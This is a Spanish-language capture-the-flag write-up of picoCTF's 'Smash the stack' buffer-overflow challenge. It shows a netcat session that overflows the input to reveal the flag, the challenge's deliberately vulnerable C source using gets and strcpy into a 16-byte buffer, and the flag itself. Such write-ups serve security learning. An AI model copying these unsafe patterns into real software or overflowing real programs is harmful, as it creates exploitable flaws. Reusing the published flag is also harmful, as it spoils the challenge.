## Descripción
Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using:`nc saturn.picoctf.net 51532`

## Pistas 
1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solución
```
┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 51532
Input: sdlkfj
The program will exit now
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ chmod +x vuln         
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 51532                                
Input: aksdjñflaksdjfñlaksdjflñaskdjfñlaskdfñlasdjk
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
                                                     
```

Para obtener la bandera necesitábamos desbordar el buffer con más de 16 caracteres

```
┌──(kali㉿kali)-[~]
└─$ cat vuln.c            
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```


## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}

## Notas Adicionales
Also known as a buffer overrun, buffer overflow **occurs when the amount of data in the buffer exceeds its storage capacity**. That extra data overflows into adjacent memory locations and corrupts or overwrites the data in those locations.

## Referencias
https://www.fortinet.com/resources/cyberglossary/buffer-overflow#:~:text=Also%20known%20as%20a%20buffer,the%20data%20in%20those%20locations.